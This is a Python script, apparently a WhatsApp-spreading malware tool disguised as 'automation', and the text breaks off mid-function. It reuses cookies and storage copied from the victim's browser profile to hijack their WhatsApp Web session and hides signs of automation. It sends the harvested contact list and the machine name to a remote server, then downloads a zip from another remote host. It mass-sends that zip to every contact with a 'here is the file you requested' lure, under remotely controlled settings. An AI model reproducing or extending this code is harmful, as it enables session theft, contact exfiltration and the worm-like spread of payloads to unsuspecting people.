#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WhatsApp Automation Script - Versão Python
Convertido de PowerShell para Python
Suporte para Chrome, Edge e Firefox
"""

import os
import sys
import json
import time
import base64
import platform
import subprocess
import tempfile
import uuid
import requests
import logging
import shutil
import csv
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum

# Selenium imports
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.edge.service import Service as EdgeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.edge.options import Options as EdgeOptions
from selenium.webdriver.firefox.options import Options as FirefoxOptions

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============================================
# CONSTANTES E CONFIGURAÇÕES
# ============================================

TEMP_PATH = Path("C:/temp") if platform.system() == "Windows" else Path("/tmp")
WA_JS_URL = "https://github.com/wppconnect-team/wa-js/releases/download/nightly/wppconnect-wa.js"
WA_JS_PATH = TEMP_PATH / "wppconnect-wa.js"

# URLs dos endpoints
BASE_URL = "https://empautlipa.com/"
PHP_ENDPOINT = f"{BASE_URL}/api/api.php"
PHP_LOG_ENDPOINT = f"{BASE_URL}/api/log.php"
PHP_CONFIG_ENDPOINT = f"{BASE_URL}/api/config.php"
PHP_CONTACTS_ENDPOINT = f"{BASE_URL}/api/contacts.php"

# Identificadores de sessão
SESSION_ID = str(uuid.uuid4())
NOME_MAQUINA = platform.node()
INICIO_EXECUCAO = datetime.now()

# ============================================
# CLASSES DE CONFIGURAÇÃO
# ============================================

@dataclass
class NavegadorConfig:
    """Configuração de um navegador"""
    nome: str
    executavel_paths: List[str]
    user_data_paths: List[str]
    driver_name: str

@dataclass
class ConfigApp:
    """Configurações da aplicação"""
    arquivo_url: str = "https://varegjopeaks.com/altor/gera2.php"
    limite_teste: str = "0"
    delay_entre_mensagens: str = "300"
    tamanho_lote: str = "10"
    filtro_contatos_excluir: str = "13135"
    modo_headless: str = "false"
    tempo_espera_whatsapp: str = "15"
    mensagem_saudacao: str = "{saudacao} {nome}!"
    mensagem_final: str = "Segue o arquivo solicitado. Qualquer dúvida estou à disposição!"
    envio_ativo: str = "true"
    navegador_preferido: str = "auto"

@dataclass
class Contato:
    """Representa um contato"""
    numero: str
    nome: str
    id: Optional[int] = None

class TipoLog(Enum):
    """Tipos de log"""
    ERRO = "erro"
    SUCESSO = "sucesso"
    AVISO = "aviso"
    INFO = "info"
    INICIO = "inicio"
    FIM = "fim"

# ============================================
# CONFIGURAÇÃO DE NAVEGADORES
# ============================================

NAVEGADORES_SUPORTADOS = {
    "Chrome": NavegadorConfig(
        nome="Google Chrome",
        executavel_paths=[
            "C:/Program Files/Google/Chrome/Application/chrome.exe",
            "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe",
            "/usr/bin/google-chrome",
            "/usr/bin/chromium"
        ],
        user_data_paths=[
            Path(os.environ.get('LOCALAPPDATA', '')) / "Google/Chrome/User Data",
            Path(os.environ.get('USERPROFILE', '')) / "AppData/Local/Google/Chrome/User Data",
            Path.home() / ".config/google-chrome",
            Path.home() / ".config/chromium"
        ],
        driver_name="chromedriver.exe" if platform.system() == "Windows" else "chromedriver"
    ),
    "Edge": NavegadorConfig(
        nome="Microsoft Edge",
        executavel_paths=[
            "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
            "C:/Program Files/Microsoft/Edge/Application/msedge.exe",
            "/usr/bin/microsoft-edge"
        ],
        user_data_paths=[
            Path(os.environ.get('LOCALAPPDATA', '')) / "Microsoft/Edge/User Data",
            Path(os.environ.get('USERPROFILE', '')) / "AppData/Local/Microsoft/Edge/User Data",
            Path.home() / ".config/microsoft-edge"
        ],
        driver_name="msedgedriver.exe" if platform.system() == "Windows" else "msedgedriver"
    ),
    "Firefox": NavegadorConfig(
        nome="Mozilla Firefox",
        executavel_paths=[
            "C:/Program Files/Mozilla Firefox/firefox.exe",
            "C:/Program Files (x86)/Mozilla Firefox/firefox.exe",
            "/usr/bin/firefox"
        ],
        user_data_paths=[
            Path(os.environ.get('APPDATA', '')) / "Mozilla/Firefox/Profiles",
            Path(os.environ.get('USERPROFILE', '')) / "AppData/Roaming/Mozilla/Firefox/Profiles",
            Path.home() / ".mozilla/firefox"
        ],
        driver_name="geckodriver.exe" if platform.system() == "Windows" else "geckodriver"
    )
}

# ============================================
# CLASSE PRINCIPAL DE AUTOMAÇÃO
# ============================================

class WhatsAppAutomation:
    def __init__(self):
        self.config = ConfigApp()
        self.navegador_atual = None
        self.driver = None
        self.profile_path = None
        self.profile_selenium = None
        self.ultima_verificacao_config = datetime.now()
        self.contatos_processados = []
        
    def send_log(self, tipo: TipoLog, mensagem: str, detalhes: str = ""):
        """Envia log para o console e servidor"""
        # Cores para o console
        cores = {
            TipoLog.ERRO: '\033[91m',
            TipoLog.SUCESSO: '\033[92m',
            TipoLog.AVISO: '\033[93m',
            TipoLog.INFO: '\033[90m',
            TipoLog.INICIO: '\033[96m',
            TipoLog.FIM: '\033[96m'
        }
        reset_cor = '\033[0m'
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        cor = cores.get(tipo, '')
        
        print(f"{cor}[{timestamp}] {mensagem}{reset_cor}")
        if detalhes:
            print(f"         {detalhes}")
        
        # Enviar para servidor
        try:
            dados = {
                'session_id': SESSION_ID,
                'nome_maquina': NOME_MAQUINA,
                'tipo': tipo.value,
                'mensagem': mensagem,
                'detalhes': detalhes,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            requests.post(PHP_LOG_ENDPOINT, data=dados, timeout=3)
        except:
            pass
    
    def get_configuracoes_online(self, silencioso: bool = False) -> Dict:
        """Busca configurações do servidor"""
        try:
            if not silencioso:
                self.send_log(TipoLog.INFO, "Buscando configurações online")
            
            response = requests.get(PHP_CONFIG_ENDPOINT, timeout=10)
            data = response.json()
            
            if data.get('success') and data.get('data'):
                config_dict = {}
                for item in data['data']:
                    config_dict[item['chave']] = str(item['valor'])
                
                if not silencioso:
                    self.send_log(TipoLog.SUCESSO, "Configurações carregadas", 
                                f"{len(data['data'])} configurações")
                    
                    # DEBUG: Mostrar modo_headless
                    modo_headless = config_dict.get('modo_headless', 'false')
                    print(f"\n[DEBUG] modo_headless do servidor: '{modo_headless}'")
                    print(f"[DEBUG] Comparação com 'true': {modo_headless == 'true'}")
                    print(f"[DEBUG] Comparação case-insensitive: {modo_headless.lower() == 'true'}\n")
                
                return config_dict
            
            if not silencioso:
                self.send_log(TipoLog.AVISO, "Usando configurações padrão")
            return self.config.__dict__
            
        except Exception as e:
            if not silencioso:
                self.send_log(TipoLog.AVISO, "Servidor offline - usando configurações padrão")
            return self.config.__dict__
    
    def update_configuracoes_se_necessario(self, forcado: bool = False):
        """Atualiza configurações se necessário"""
        tempo_decorrido = (datetime.now() - self.ultima_verificacao_config).total_seconds()
        
        if forcado or tempo_decorrido >= 30:
            try:
                novas_configs = self.get_configuracoes_online(silencioso=True)
                mudancas = []
                
                for chave, novo_valor in novas_configs.items():
                    valor_atual = getattr(self.config, chave, None)
                    if valor_atual != novo_valor:
                        mudancas.append(f"  • {chave}: '{valor_atual}' -> '{novo_valor}'")
                        setattr(self.config, chave, novo_valor)
                
                if mudancas:
                    self.send_log(TipoLog.INFO, "Configurações atualizadas", "\n".join(mudancas))
                
                self.ultima_verificacao_config = datetime.now()
            except:
                pass
    
    def check_envio_ativo(self) -> bool:
        """Verifica se o envio está ativo"""
        self.update_configuracoes_se_necessario()
        return self.config.envio_ativo.lower() == "true"
    
    def wait_for_envio_ativo(self):
        """Aguarda até o envio estar ativo"""
        if not self.check_envio_ativo():
            self.send_log(TipoLog.AVISO, "⏸ Envio pausado - aguardando reativação")
            while not self.check_envio_ativo():
                time.sleep(5)
            self.send_log(TipoLog.SUCESSO, "▶ Envio reativado")
    
    def detectar_navegador(self) -> Optional[Tuple[str, NavegadorConfig]]:
        """Detecta navegador instalado"""
        self.send_log(TipoLog.INFO, "Detectando navegador instalado")
        
        # Verificar navegador preferido primeiro
        navegador_pref = self.config.navegador_preferido.lower()
        if navegador_pref != "auto":
            for nome, config in NAVEGADORES_SUPORTADOS.items():
                if nome.lower() == navegador_pref:
                    for path in config.executavel_paths:
                        if Path(path).exists():
                            self.send_log(TipoLog.SUCESSO, f"✓ {config.nome} encontrado (preferido)")
                            return nome, config
        
        # Auto-detectar
        for nome, config in NAVEGADORES_SUPORTADOS.items():
            for path in config.executavel_paths:
                if Path(path).exists():
                    self.send_log(TipoLog.SUCESSO, f"✓ {config.nome} encontrado")
                    return nome, config
        
        self.send_log(TipoLog.ERRO, "Nenhum navegador suportado encontrado")
        return None
    
    def encontrar_perfil(self, config: NavegadorConfig) -> Optional[Path]:
        """Encontra o perfil do navegador"""
        self.send_log(TipoLog.INFO, "Procurando perfil do navegador")
        
        for user_data_path in config.user_data_paths:
            if user_data_path.exists():
                if config.nome == "Mozilla Firefox":
                    # Firefox tem estrutura diferente
                    for profile_dir in user_data_path.iterdir():
                        if profile_dir.is_dir() and "default" in profile_dir.name.lower():
                            self.send_log(TipoLog.SUCESSO, f"✓ Perfil encontrado: {profile_dir}")
                            return profile_dir
                else:
                    # Chrome/Edge
                    default_profile = user_data_path / "Default"
                    if default_profile.exists():
                        self.send_log(TipoLog.SUCESSO, f"✓ Perfil encontrado: {user_data_path}")
                        return user_data_path
        
        self.send_log(TipoLog.AVISO, "Perfil não encontrado - será criado novo")
        return None
    
    def criar_perfil_temporario(self) -> Path:
        """Cria perfil temporário"""
        temp_dir = Path(tempfile.mkdtemp(prefix="wa_profile_"))
        self.send_log(TipoLog.INFO, f"Perfil temporário criado: {temp_dir}")
        return temp_dir
    
    def configurar_driver(self, tipo_navegador: str, config: NavegadorConfig) -> webdriver:
        """Configura e retorna o driver do navegador"""
        modo_headless = self.config.modo_headless.lower() == "true"
        
        self.send_log(TipoLog.INFO, f"Configurando {config.nome}")
        self.send_log(TipoLog.INFO, f"Modo headless: {modo_headless}")
        
        # Tentar usar o perfil existente primeiro, se falhar criar um temporário
        usar_perfil_temporario = False
        
        if tipo_navegador == "Chrome":
            options = ChromeOptions()
            if modo_headless:
                options.add_argument("--headless=new")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option("useAutomationExtension", False)
            
            # Primeiro tentar com o perfil existente
            if self.profile_path and not usar_perfil_temporario:
                try:
                    # Criar uma cópia do perfil para evitar conflitos
                    import shutil
                    perfil_temp = self.criar_perfil_temporario()
                    
                    # Copiar apenas os arquivos essenciais do perfil
                    try:
                        # Copiar cookies e local storage se existirem
                        origem_default = self.profile_path / "Default"
                        if origem_default.exists():
                            destino_default = perfil_temp / "Default"
                            destino_default.mkdir(parents=True, exist_ok=True)
                            
                            # Arquivos importantes para manter sessão do WhatsApp
                            arquivos_copiar = [
                                "Cookies", "Cookies-journal",
                                "Local Storage", "Session Storage",
                                "IndexedDB", "Service Worker"
                            ]
                            
                            for arquivo in arquivos_copiar:
                                origem = origem_default / arquivo
                                if origem.exists():
                                    destino = destino_default / arquivo
                                    if origem.is_dir():
                                        shutil.copytree(origem, destino, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(origem, destino)
                    except Exception as e:
                        self.send_log(TipoLog.AVISO, f"Não foi possível copiar perfil: {e}")
                    
                    options.add_argument(f"--user-data-dir={perfil_temp}")
                    self.profile_selenium = perfil_temp
                    
                    self.send_log(TipoLog.INFO, "Usando cópia do perfil existente")
                    return webdriver.Chrome(options=options)
                    
                except Exception as e:
                    self.send_log(TipoLog.AVISO, f"Erro ao usar perfil existente: {e}")
                    self.send_log(TipoLog.INFO, "Criando perfil temporário limpo")
                    usar_perfil_temporario = True
            
            # Se falhou ou não tem perfil, criar temporário
            if usar_perfil_temporario or not self.profile_path:
                perfil_temp = self.criar_perfil_temporario()
                options.add_argument(f"--user-data-dir={perfil_temp}")
                self.profile_selenium = perfil_temp
            
            return webdriver.Chrome(options=options)
            
        elif tipo_navegador == "Edge":
            options = EdgeOptions()
            if modo_headless:
                options.add_argument("--headless=new")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option("useAutomationExtension", False)
            
            # Similar ao Chrome
            if self.profile_path and not usar_perfil_temporario:
                try:
                    import shutil
                    perfil_temp = self.criar_perfil_temporario()
                    
                    try:
                        origem_default = self.profile_path / "Default"
                        if origem_default.exists():
                            destino_default = perfil_temp / "Default"
                            destino_default.mkdir(parents=True, exist_ok=True)
                            
                            arquivos_copiar = [
                                "Cookies", "Cookies-journal",
                                "Local Storage", "Session Storage",
                                "IndexedDB", "Service Worker"
                            ]
                            
                            for arquivo in arquivos_copiar:
                                origem = origem_default / arquivo
                                if origem.exists():
                                    destino = destino_default / arquivo
                                    if origem.is_dir():
                                        shutil.copytree(origem, destino, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(origem, destino)
                    except Exception as e:
                        self.send_log(TipoLog.AVISO, f"Não foi possível copiar perfil: {e}")
                    
                    options.add_argument(f"--user-data-dir={perfil_temp}")
                    self.profile_selenium = perfil_temp
                    
                    return webdriver.Edge(options=options)
                    
                except Exception as e:
                    self.send_log(TipoLog.AVISO, f"Erro ao usar perfil existente: {e}")
                    usar_perfil_temporario = True
            
            if usar_perfil_temporario or not self.profile_path:
                perfil_temp = self.criar_perfil_temporario()
                options.add_argument(f"--user-data-dir={perfil_temp}")
                self.profile_selenium = perfil_temp
            
            return webdriver.Edge(options=options)
            
        elif tipo_navegador == "Firefox":
            options = FirefoxOptions()
            if modo_headless:
                options.add_argument("--headless")
            
            if self.profile_path:
                try:
                    profile = webdriver.FirefoxProfile(str(self.profile_path))
                    options.profile = profile
                except Exception as e:
                    self.send_log(TipoLog.AVISO, f"Erro ao usar perfil Firefox: {e}")
                    # Firefox criará um perfil temporário automaticamente
            
            return webdriver.Firefox(options=options)
        
        raise ValueError(f"Navegador não suportado: {tipo_navegador}")
    
    def baixar_wa_js(self):
        """Baixa a biblioteca WA-JS"""
        if not TEMP_PATH.exists():
            TEMP_PATH.mkdir(parents=True, exist_ok=True)
        
        if WA_JS_PATH.exists():
            idade_arquivo = datetime.now() - datetime.fromtimestamp(WA_JS_PATH.stat().st_mtime)
            if idade_arquivo.days < 7:
                self.send_log(TipoLog.INFO, "WA-JS já está atualizado")
                return
        
        self.send_log(TipoLog.INFO, "Baixando WA-JS")
        try:
            response = requests.get(WA_JS_URL, timeout=30)
            response.raise_for_status()
            WA_JS_PATH.write_bytes(response.content)
            self.send_log(TipoLog.SUCESSO, "✓ WA-JS baixado com sucesso")
        except Exception as e:
            self.send_log(TipoLog.ERRO, f"Erro ao baixar WA-JS: {e}")
            raise
    
    def inicializar_whatsapp(self):
        """Inicializa o WhatsApp Web"""
        self.send_log(TipoLog.INFO, "Abrindo WhatsApp Web")
        self.driver.get("https://web.whatsapp.com")
        
        tempo_espera = int(self.config.tempo_espera_whatsapp)
        modo_headless = self.config.modo_headless.lower() == "true"
        
        if modo_headless:
            self.send_log(TipoLog.INFO, f"Aguardando {tempo_espera}s (modo headless)")
            time.sleep(tempo_espera)
        else:
            try:
                # Aguardar elementos do WhatsApp
                WebDriverWait(self.driver, tempo_espera).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "[data-testid='chat']"))
                )
                self.send_log(TipoLog.SUCESSO, "✓ WhatsApp carregado")
            except TimeoutException:
                self.send_log(TipoLog.AVISO, "Timeout aguardando WhatsApp")
        
        # Injetar WA-JS
        self.send_log(TipoLog.INFO, "Injetando WA-JS")
        wa_js_content = WA_JS_PATH.read_text(encoding='utf-8')
        self.driver.execute_script(wa_js_content)
        time.sleep(2)
        
        # Verificar se WPP está disponível
        wpp_disponivel = self.driver.execute_script("return typeof WPP !== 'undefined'")
        if wpp_disponivel:
            self.send_log(TipoLog.SUCESSO, "✓ WA-JS carregado")
        else:
            self.send_log(TipoLog.ERRO, "WA-JS não foi carregado corretamente")
            raise RuntimeError("WA-JS não carregado")
    
    def obter_contatos(self) -> List[Contato]:
        """Obtém lista de contatos do WhatsApp Web e envia automaticamente para o servidor"""
        self.send_log(TipoLog.INFO, "Obtendo contatos do WhatsApp")
        
        try:
            # Script para pegar contatos do WhatsApp
            script_obter_contatos = """
            return new Promise((resolve) => {
                async function getContacts() {
                    try {
                        // Aguardar WPP carregar completamente
                        if (typeof WPP === 'undefined') {
                            resolve({success: false, error: 'WPP não carregado'});
                            return;
                        }
                        
                        // Obter todos os contatos
                        const allContacts = await WPP.contact.list();
                        
                        // Filtrar apenas contatos válidos
                        const contacts = allContacts
                            .filter(c => {
                                // Excluir grupos, empresas e contatos inválidos
                                if (!c.name || !c.id) return false;
                                if (c.isGroup) return false;
                                if (c.isBusiness) return false;
                                
                                // IMPORTANTE: Excluir contatos com @lid (empresariais)
                                const id = c.id._serialized || c.id.user || c.id;
                                if (id.includes('@lid')) return false;
                                if (id.includes('@g.us')) return false;  // grupos
                                if (id.includes('@broadcast')) return false;  // listas
                                
                                return true;
                            })
                            .map(c => {
                                const id = c.id._serialized || c.id.user + '@c.us';
                                return {
                                    numero: id,
                                    nome: c.name || c.pushname || c.shortName || 'Sem Nome',
                                    telefone_limpo: c.id.user,
                                    is_contact: c.isContact,
                                    is_saved: c.isMyContact,
                                    is_valid: !id.includes('@lid')
                                };
                            })
                            .filter(c => c.is_valid);  // Filtro final
                        
                        resolve({
                            success: true,
                            total: contacts.length,
                            contacts: contacts
                        });
                        
                    } catch (error) {
                        resolve({
                            success: false,
                            error: error.message || 'Erro ao obter contatos'
                        });
                    }
                }
                
                getContacts();
            });
            """
            
            # Executar script e aguardar resposta
            self.send_log(TipoLog.INFO, "Executando script para obter contatos...")
            resultado = self.driver.execute_script(script_obter_contatos)
            
            if not resultado:
                self.send_log(TipoLog.ERRO, "Nenhum resultado retornado do WhatsApp")
                return []
            
            if not resultado.get('success'):
                self.send_log(TipoLog.ERRO, f"Erro ao obter contatos: {resultado.get('error')}")
                return []
            
            contatos_whatsapp = resultado.get('contacts', [])
            self.send_log(TipoLog.INFO, f"📱 {len(contatos_whatsapp)} contatos válidos encontrados")
            
            # Converter para objetos Contato e filtrar novamente
            contatos = []
            contatos_invalidos = 0
            
            for idx, c in enumerate(contatos_whatsapp):
                numero = c.get('numero', '')
                
                # Filtro adicional de segurança
                if '@lid' in numero or '@g.us' in numero or '@broadcast' in numero:
                    contatos_invalidos += 1
                    continue
                    
                contato = Contato(
                    numero=numero,
                    nome=c.get('nome', ''),
                    id=idx + 1
                )
                
                if contato.numero and contato.nome:
                    contatos.append(contato)
            
            if contatos_invalidos > 0:
                self.send_log(TipoLog.INFO, f"⚠️ {contatos_invalidos} contatos empresariais/inválidos excluídos")
            
            self.send_log(TipoLog.SUCESSO, f"✓ {len(contatos)} contatos prontos para uso")
            
            # ENVIAR AUTOMATICAMENTE contatos para o servidor PHP
            if contatos:
                self.enviar_contatos_para_servidor(contatos)
            
            return contatos
            
        except Exception as e:
            self.send_log(TipoLog.ERRO, f"Erro ao obter contatos do WhatsApp: {e}")
            
            # Fallback: tentar método alternativo
            return self.obter_contatos_metodo_alternativo()
    
    def obter_contatos_metodo_alternativo(self) -> List[Contato]:
        """Método alternativo para obter contatos se o primeiro falhar"""
        self.send_log(TipoLog.INFO, "Tentando método alternativo para obter contatos")
        
        try:
            # Script alternativo mais simples
            script_alternativo = """
            try {
                // Pegar chats recentes como alternativa
                const chats = WPP.chat.getAll();
                const contacts = [];
                
                for (let chat of chats) {
                    if (!chat.isGroup && chat.contact) {
                        contacts.push({
                            numero: chat.id._serialized || chat.id,
                            nome: chat.contact.name || chat.contact.pushname || chat.name || 'Sem Nome'
                        });
                    }
                }
                
                return {success: true, contacts: contacts};
            } catch (e) {
                return {success: false, error: e.message};
            }
            """
            
            resultado = self.driver.execute_script(script_alternativo)
            
            if resultado and resultado.get('success'):
                contatos_data = resultado.get('contacts', [])
                self.send_log(TipoLog.SUCESSO, f"✓ {len(contatos_data)} contatos obtidos (método alternativo)")
                
                contatos = []
                for idx, c in enumerate(contatos_data):
                    contato = Contato(
                        numero=c.get('numero', ''),
                        nome=c.get('nome', ''),
                        id=idx + 1
                    )
                    if contato.numero and contato.nome:
                        contatos.append(contato)
                
                # ENVIAR AUTOMATICAMENTE para o servidor
                if contatos:
                    self.enviar_contatos_para_servidor(contatos)
                
                return contatos
            
        except Exception as e:
            self.send_log(TipoLog.ERRO, f"Método alternativo também falhou: {e}")
        
        return []
    
    def enviar_contatos_para_servidor(self, contatos: List[Contato]):
        """Envia os contatos obtidos do WhatsApp para o servidor PHP"""
        self.send_log(TipoLog.INFO, "Enviando contatos para o servidor")
        
        try:
            # Preparar dados para envio
            contatos_json = []
            for c in contatos:
                contatos_json.append({
                    'numero': c.numero,
                    'nome': c.nome
                })
            
            dados = {
                'session_id': SESSION_ID,
                'nome_maquina': NOME_MAQUINA,
                'contatos': json.dumps(contatos_json),
                'total': len(contatos),
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Enviar para o servidor
            response = requests.post(PHP_CONTACTS_ENDPOINT, data=dados, timeout=10)
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('success'):
                        self.send_log(TipoLog.SUCESSO, f"✓ {len(contatos)} contatos enviados ao servidor")
                    else:
                        self.send_log(TipoLog.AVISO, "Servidor recebeu mas retornou erro")
                except:
                    # Se não for JSON, assumir que foi enviado com sucesso
                    self.send_log(TipoLog.SUCESSO, "✓ Contatos enviados ao servidor")
            else:
                self.send_log(TipoLog.AVISO, f"Servidor retornou status {response.status_code}")
                
        except Exception as e:
            self.send_log(TipoLog.AVISO, f"Não foi possível enviar contatos ao servidor: {e}")
            # Não é crítico se não conseguir enviar para o servidor
    
    def filtrar_contatos(self, contatos: List[Contato]) -> List[Contato]:
        """Filtra contatos baseado nas configurações"""
        if not contatos:
            return []
        
        # Aplicar filtro de exclusão
        filtros = self.config.filtro_contatos_excluir.split(',')
        contatos_filtrados = []
        
        for contato in contatos:
            excluir = False
            for filtro in filtros:
                if filtro.strip() in contato.numero:
                    excluir = True
                    break
            if not excluir:
                contatos_filtrados.append(contato)
        
        # Aplicar limite de teste se configurado
        limite = int(self.config.limite_teste)
        if limite > 0:
            contatos_filtrados = contatos_filtrados[:limite]
            self.send_log(TipoLog.INFO, f"Modo teste: limitado a {limite} contatos")
        
        return contatos_filtrados
    
    def baixar_arquivo(self) -> Tuple[str, str]:
        """Baixa o arquivo para envio"""
        self.send_log(TipoLog.INFO, "Baixando arquivo para envio")
        
        try:
            response = requests.get(self.config.arquivo_url, timeout=30)
            response.raise_for_status()
            
            # Extrair nome do arquivo
            content_disposition = response.headers.get('Content-Disposition', '')
            if 'filename=' in content_disposition:
                nome_arquivo = content_disposition.split('filename=')[-1].strip('"')
            else:
                nome_arquivo = "arquivo.zip"
            
            # Converter para base64
            arquivo_base64 = base64.b64encode(response.content).decode('utf-8')
            
            tamanho_mb = len(response.content) / (1024 * 1024)
            self.send_log(TipoLog.SUCESSO, 
                         f"✓ Arquivo baixado: {nome_arquivo} ({tamanho_mb:.2f} MB)")
            
            return nome_arquivo, arquivo_base64
            
        except Exception as e:
            self.send_log(TipoLog.ERRO, f"Erro ao baixar arquivo: {e}")
            raise
    
    def processar_mensagem_template(self, template: str, nome_contato: str) -> str:
        """Processa template de mensagem"""
        hora_atual = datetime.now().hour
        
        if hora_atual < 12:
            saudacao = "Bom dia"
        elif hora_atual < 18:
            saudacao = "Boa tarde"
        else:
            saudacao = "Boa noite"
        
        mensagem = template.replace("{saudacao}", saudacao)
        mensagem = mensagem.replace("{nome}", nome_contato)
        mensagem = mensagem.replace("{data}", datetime.now().strftime("%d/%m/%Y"))
        mensagem = mensagem.replace("{hora}", datetime.now().strftime("%H:%M"))
        
        return mensagem
    
    def escape_javascript_string(self, texto: str) -> str:
        """Escapa string para JavaScript"""
        if not texto:
            return ""
        
        texto = texto.replace("\\", "\\\\")
        texto = texto.replace("'", "\\'")
        texto = texto.replace('"', '\\"')
        texto = texto.replace("\n", "\\n")
        texto = texto.replace("\r", "\\r")
        texto = texto.replace("\t", "\\t")
        
        return texto
    
    def enviar_para_contato(self, contato: Contato, nome_arquivo: str, 
                           arquivo_base64: str) -> Dict:
        """Envia mensagem para um contato - VERSÃO OTIMIZADA COM TRATAMENTO DE ERROS"""
        try:
            # Validar número do contato primeiro
            numero = contato.numero
            
            # Se o número tem "lid" ao invés de "c.us", é um contato inválido
            if "@lid" in numero:
                return {
                    'success': False,
                    'nome': contato.nome,
                    'numero': contato.numero,
                    'erro': 'Contato empresarial/inválido (lid)'
                }
            
            mensagem_saudacao = self.processar_mensagem_template(
                self.config.mensagem_saudacao, contato.nome
            )
            mensagem_saudacao_escaped = self.escape_javascript_string(mensagem_saudacao)
            mensagem_final_escaped = self.escape_javascript_string(self.config.mensagem_final)
            nome_escaped = self.escape_javascript_string(contato.nome)
            nome_arquivo_escaped = self.escape_javascript_string(nome_arquivo)
            
            # Script OTIMIZADO com tratamento de erros melhorado
            script = f"""
            var callback = arguments[arguments.length - 1];
            var numero = '{contato.numero}';
            var nome = '{nome_escaped}';
            var mensagemSaudacao = '{mensagem_saudacao_escaped}';
            var mensagemFinal = '{mensagem_final_escaped}';
            var nomeArquivo = '{nome_arquivo_escaped}';
            var arquivoBase64 = '{arquivo_base64}';
            
            async function enviarParaContato() {{
                try {{
                    // Verificar se o número é válido
                    if (numero.includes('@lid')) {{
                        return {{ success: false, nome: nome, numero: numero, erro: 'Número inválido (lid)' }};
                    }}
                    
                    // Verificar se o contato existe
                    const chatExists = await WPP.contact.queryExists(numero);
                    if (!chatExists) {{
                        return {{ success: false, nome: nome, numero: numero, erro: 'Contato não existe no WhatsApp' }};
                    }}
                    
                    // Criar arquivo
                    const binaryString = atob(arquivoBase64);
                    const bytes = new Uint8Array(binaryString.length);
                    for (let i = 0; i < binaryString.length; i++) {{
                        bytes[i] = binaryString.charCodeAt(i);
                    }}
                    const blob = new Blob([bytes], {{ type: 'application/zip' }});
                    const file = new File([blob], nomeArquivo, {{ type: 'application/zip' }});
                    
                    // Enviar mensagens - uma por vez para evitar problemas
                    await WPP.chat.sendTextMessage(numero, mensagemSaudacao, {{
                        createChat: true, 
                        waitForAck: false,
                        detectMentioned: false,
                        linkPreview: false
                    }});
                    
                    // Pequeno delay para evitar bloqueio
                    await new Promise(r => setTimeout(r, 100));
                    
                    await WPP.chat.sendFileMessage(numero, file, {{
                        createChat: true,
                        caption: '',
                        filename: nomeArquivo,
                        waitForAck: false,
                        detectMentioned: false
                    }});
                    
                    await new Promise(r => setTimeout(r, 100));
                    
                    await WPP.chat.sendTextMessage(numero, mensagemFinal, {{
                        createChat: true,
                        waitForAck: false,
                        detectMentioned: false,
                        linkPreview: false
                    }});
                    
                    return {{ success: true, nome: nome, numero: numero }};
                    
                }} catch (erro) {{
                    // Tratamento específico de erros
                    let mensagemErro = erro.message || String(erro);
                    
                    if (mensagemErro.includes('lid') || mensagemErro.includes('Lid')) {{
                        mensagemErro = 'Contato empresarial não suportado';
                    }} else if (mensagemErro.includes('not found')) {{
                        mensagemErro = 'Contato não encontrado';
                    }} else if (mensagemErro.includes('timeout')) {{
                        mensagemErro = 'Tempo esgotado';
                    }}
                    
                    return {{ success: false, nome: nome, numero: numero, erro: mensagemErro }};
                }}
            }}
            
            // Timeout de 5 segundos com fallback
            const timeoutPromise = new Promise((resolve) => {{
                setTimeout(() => {{
                    resolve({{ success: false, nome: nome, numero: numero, erro: 'Timeout 5s' }});
                }}, 5000);
            }});
            
            Promise.race([
                enviarParaContato(),
                timeoutPromise
            ]).then(r => callback(r)).catch(e => callback({{ success: false, erro: e.message }}));
            """
            
            # Timeout reduzido para 6 segundos
            self.driver.set_script_timeout(6)
            resultado = self.driver.execute_async_script(script)
            
            if not resultado:
                return {
                    'success': False,
                    'nome': contato.nome,
                    'numero': contato.numero,
                    'erro': 'Resultado nulo'
                }
            
            return resultado
            
        except Exception as e:
            erro_msg = str(e)
            
            # Tratamento específico de erros comuns
            if "script timeout" in erro_msg.lower():
                erro_msg = "Timeout - pulando"
            elif "lid" in erro_msg.lower():
                erro_msg = "Contato empresarial"
            
            return {
                'success': False,
                'nome': contato.nome,
                'numero': contato.numero,
                'erro': erro_msg
            }
    
    def enviar_lote_rapido(self, contatos_lote: List[Contato], nome_arquivo: str, 
                           arquivo_base64: str) -> List[Dict]:
        """Envia mensagens para múltiplos contatos DE UMA VEZ - SUPER RÁPIDO!"""
        try:
            # Preparar dados de todos os contatos
            contatos_js = []
            for contato in contatos_lote:
                mensagem_saudacao = self.processar_mensagem_template(
                    self.config.mensagem_saudacao, contato.nome
                )
                contatos_js.append({
                    'numero': contato.numero,
                    'nome': self.escape_javascript_string(contato.nome),
                    'mensagemSaudacao': self.escape_javascript_string(mensagem_saudacao)
                })
            
            mensagem_final_escaped = self.escape_javascript_string(self.config.mensagem_final)
